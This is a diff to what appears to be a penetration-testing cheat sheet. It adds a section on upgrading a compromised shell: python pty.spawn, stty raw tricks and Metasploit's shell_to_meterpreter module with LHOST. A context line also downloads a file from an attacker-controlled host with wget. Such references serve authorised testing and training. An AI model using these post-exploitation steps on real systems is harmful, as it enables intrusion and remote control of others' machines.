@@ -448,4 +448,48 @@ cd /tmp
 wget http://<ip>/<filename>
 ```
 
+### Upgrading Shells
+#### Bash
+```
+cat /etc/shells
+/bin/bash -i
+```
+
+#### Python
+```
+which python python3
+
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+#### Magic
+```
+which python python3
+python -c 'import pty; pty.spawn("/bin/bash")'
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl + Z
+
+echo $TERM
+stty -a
+stty raw -echo
+fg
+
+reset
+export SHELL=bash
+export TERM=xterm-256color
+stty rows <no_of_rows> columns <no_of_columns>
+```
+
+#### Upgrade to Meterpreter Shell
+```
+sessions -u <session_id>
+```
+```
+use post/multi/manage/shell_to_meterpreter
+set LHOST <ip>
+set SESSION <session_id>
+set WIN_TRANSFER VBS
+```
+
 ## Social Engineering
